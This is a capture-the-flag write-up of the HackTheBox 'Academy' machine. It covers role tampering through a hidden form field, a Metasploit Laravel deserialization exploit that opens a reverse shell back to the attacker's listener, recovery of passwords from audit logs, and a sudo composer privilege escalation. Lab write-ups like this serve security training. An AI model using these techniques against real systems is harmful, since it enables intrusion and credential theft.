---
layout: post
title: HackTheBox - Academy
date: 2021-03-03 19:44:17 +0100
tags: [HackTheBox]
image: /assets/img/htb/machines/linux/easy/academy/Academy.png
---

## Foothold

### Nmap Scan (open Ports)

{% highlight bash %}
$ nmap -min-rate 5000 --max-retries 1 -sV -oA Academy 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

### Apache httpd (port 80)

![Port 80](/assets/img/htb/machines/linux/easy/academy/80.png)

Once we go to [http://10.10.10.215](http://10.10.10.215), we can see two links:

- [http://10.10.10.215/login.php](http://10.10.10.215/login.php)
- [http://10.10.10.215/register.php](http://10.10.10.215/register.php)

If we check the source-code of the register page, we can notice there is an input which is **hidden**:

![Role id](/assets/img/htb/machines/linux/easy/academy/roleid.png)

If we set its value to 1, we can access to: [http://10.10.10.215/admin-page.php](http://10.10.10.215/admin-page.php)

Once we're logged in, we can see there is a sub-domain whcih is mentionned `dev-staging-01.academy.htb`:

![admin-page](/assets/img/htb/machines/linux/easy/academy/admin-page.png)

We add these domains into our `/etc/hosts`:

![/etc/hosts](/assets/img/htb/machines/linux/easy/academy/etc-hosts.png)

Then we access to the subdomain:

![subdomain](/assets/img/htb/machines/linux/easy/academy/subdomain.png)

It seems to be a **Laravel** backend:

![laravel](/assets/img/htb/machines/linux/easy/academy/laravel.png)

We can notice there are some sensible information like:

![APP_KEY](/assets/img/htb/machines/linux/easy/academy/APP_KEY.png)


Using **metasploit**, we can gain a reverse shell to web server:

![msf](/assets/img/htb/machines/linux/easy/academy/msf.png)

{% highlight bash %}
msf6 > use exploit/unix/http/laravel_token_unserialize_exec
[*] Using configured payload cmd/unix/reverse_perl
# Setting options
msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options
...
   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.11      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
{% endhighlight %}

![reverse_shell](/assets/img/htb/machines/linux/easy/academy/reverse_shell.png)

## User1: `cry0l1t3`

In the `/home` directory, we can see there are a bunch of users. One one them has a `user.txt` file: 

![cry0l1t3](/assets/img/htb/machines/linux/easy/academy/cry0l1t3.png)

By doing some recursive research through files upon files we find this password: 

![password](/assets/img/htb/machines/linux/easy/academy/dev_password.png)

It appears that it's the password of **cry0l1t3** user.

{% highlight bash %}
cry0l1t3@academy:/home/cry0l1t3:~$ cat user.txt
064f918982d32d8040efb7c1b66a486
{% endhighlight %}

## User2: `mrb3n`

**cry0l1t3** is part of the **adm** group.

Via `find` we can list all files that are owned by this group:

`find / -group adm -exec ls -la {} \; 2>/dev/null`

Most of them are in `/var/log`.

After reading about [linux var log files](https://www.thegeekstuff.com/2011/08/linux-var-log-files/), I found this article "[Logging passwords on Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)". Before continuing, I highly recommend that you read this article.

In `/var/log/audit/` directory, we can retrieve `mrb3n`'s password:

{% highlight bash %}
cry0l1t3@academy:/var/log/audit$ grep "data=" *  
audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
...
cry0l1t3@academy:/var/log/audit$ echo 7375206D7262336E0A | xxd -r -p
su mrb3n
cry0l1t3@academy:/var/log/audit$ echo 6D7262336E5F41634064336D79210A | xxd -r -p
mrb3n_Ac@d3my!
{% endhighlight %}

## Root

Now that we have access to `mrb3n` account, let's do some enumeration and see what we can do with `sudo`:

![mrb3n](/assets/img/htb/machines/linux/easy/academy/mrb3n.png)

`composer` is listed in [GTFOBins](https://gtfobins.github.io/gtfobins/composer/):

![gtfobins](/assets/img/htb/machines/linux/easy/academy/gtfobins.png)

To perform a privesc, we can exploit it and then become `root`:

![root](/assets/img/htb/machines/linux/easy/academy/root.png)

___

## Useful links

- [Linux var log files](https://www.thegeekstuff.com/2011/08/linux-var-log-files/)
- [Logging Passwords on Linux - `/var/log/audit/audit.log`](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)